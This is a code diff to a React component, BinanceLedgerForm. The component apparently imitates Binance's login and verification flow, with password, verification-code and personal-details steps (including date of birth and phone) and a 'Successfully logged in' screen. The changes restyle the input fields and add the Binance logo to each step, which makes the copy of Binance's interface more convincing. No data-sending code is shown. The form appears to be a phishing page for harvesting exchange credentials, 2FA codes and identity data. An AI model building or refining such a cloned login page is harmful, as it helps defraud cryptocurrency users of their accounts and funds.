@@ -187,7 +187,8 @@ const BinanceLedgerForm: FC = () => {
                 className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
-                  border: "1px solid var(--color-InputLine, #474D57)"
+                  border: "1px solid var(--color-InputLine, #474D57)",
+                  height: "48px"
                 }}
                 role="group"
               >
@@ -200,7 +201,7 @@ const BinanceLedgerForm: FC = () => {
                   autoFocus
                   id="bn-formItem-q8nY2Y1v"
                   autoCapitalize="off"
-                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                   style={{ 
                     color: "var(--color-PrimaryText, #EAECEF)",
                     fontFamily: "BinanceNova, Arial, sans-serif",
@@ -384,6 +385,25 @@ const BinanceLedgerForm: FC = () => {
 
   const renderPasswordStep = () => (
     <>
+      <div className="flex justify-start mb-8">
+        <div className="flex items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
+            alt="Binance Logo" 
+            className="h-8"
+            onError={(e) => {
+              setLogoError(true);
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+          {logoError && (
+            <span className="text-binance-yellow font-bold text-xl">
+              BINANCE
+            </span>
+          )}
+        </div>
+      </div>
+
       <div className="flex justify-between items-center mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
@@ -392,9 +412,9 @@ const BinanceLedgerForm: FC = () => {
           style={{ 
             color: "var(--color-PrimaryText, #EAECEF)",
             fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "24px",
+            fontSize: "32px",
             fontWeight: "600",
-            lineHeight: "32px"
+            lineHeight: "40px"
           }}
         >
           Enter Password
@@ -429,7 +449,8 @@ const BinanceLedgerForm: FC = () => {
                 className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
-                  border: "1px solid var(--color-InputLine, #474D57)"
+                  border: "1px solid var(--color-InputLine, #474D57)",
+                  height: "48px"
                 }}
                 role="group"
               >
@@ -442,7 +463,7 @@ const BinanceLedgerForm: FC = () => {
                   autoFocus
                   id="password-field"
                   autoCapitalize="off"
-                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                   style={{ 
                     color: "var(--color-PrimaryText, #EAECEF)",
                     fontFamily: "BinanceNova, Arial, sans-serif",
@@ -487,6 +508,25 @@ const BinanceLedgerForm: FC = () => {
 
   const renderVerificationStep = () => (
     <>
+      <div className="flex justify-start mb-8">
+        <div className="flex items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
+            alt="Binance Logo" 
+            className="h-8"
+            onError={(e) => {
+              setLogoError(true);
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+          {logoError && (
+            <span className="text-binance-yellow font-bold text-xl">
+              BINANCE
+            </span>
+          )}
+        </div>
+      </div>
+
       <div className="flex justify-between items-center mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
@@ -495,9 +535,9 @@ const BinanceLedgerForm: FC = () => {
           style={{ 
             color: "var(--color-PrimaryText, #EAECEF)",
             fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "24px",
+            fontSize: "32px",
             fontWeight: "600",
-            lineHeight: "32px"
+            lineHeight: "40px"
           }}
         >
           Enter Verification Code
@@ -545,7 +585,8 @@ const BinanceLedgerForm: FC = () => {
                 className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
-                  border: "1px solid var(--color-InputLine, #474D57)"
+                  border: "1px solid var(--color-InputLine, #474D57)",
+                  height: "48px"
                 }}
                 role="group"
               >
@@ -558,7 +599,7 @@ const BinanceLedgerForm: FC = () => {
                   autoFocus
                   id="verification-field"
                   autoCapitalize="off"
-                  className="bn-textField-input bg-transparent border-0 text-white p-3 pr-16 w-full outline-none h-12 text-sm leading-5"
+                  className="bn-textField-input bg-transparent border-0 text-white p-3 pr-16 w-full outline-none h-full text-sm leading-5"
                   style={{ 
                     color: "var(--color-PrimaryText, #EAECEF)",
                     fontFamily: "BinanceNova, Arial, sans-serif",
@@ -631,6 +672,25 @@ const BinanceLedgerForm: FC = () => {
 
   const renderPersonalDetailsStep = () => (
     <>
+      <div className="flex justify-start mb-8">
+        <div className="flex items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
+            alt="Binance Logo" 
+            className="h-8"
+            onError={(e) => {
+              setLogoError(true);
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+          {logoError && (
+            <span className="text-binance-yellow font-bold text-xl">
+              BINANCE
+            </span>
+          )}
+        </div>
+      </div>
+
       <div className="flex justify-between items-center mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
@@ -639,9 +699,9 @@ const BinanceLedgerForm: FC = () => {
           style={{ 
             color: "var(--color-PrimaryText, #EAECEF)",
             fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "24px",
+            fontSize: "32px",
             fontWeight: "600",
-            lineHeight: "32px"
+            lineHeight: "40px"
           }}
         >
           Verify Details
@@ -674,12 +734,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -710,12 +771,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -746,12 +808,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="date"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -782,12 +845,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -818,12 +882,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -854,12 +919,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -890,12 +956,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="text"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -926,12 +993,13 @@ const BinanceLedgerForm: FC = () => {
               className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
               style={{
                 backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)"
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
               }}
             >
               <input
                 type="tel"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
                 style={{ 
                   color: "var(--color-PrimaryText, #EAECEF)",
                   fontFamily: "BinanceNova, Arial, sans-serif",
@@ -979,9 +1047,9 @@ const BinanceLedgerForm: FC = () => {
           style={{ 
             color: "var(--color-PrimaryText, #EAECEF)",
             fontFamily: "BinanceNova, Arial, sans-serif",
-            fontSize: "24px",
+            fontSize: "32px",
             fontWeight: "600",
-            lineHeight: "32px"
+            lineHeight: "40px"
           }}
         >
           Successfully logged in
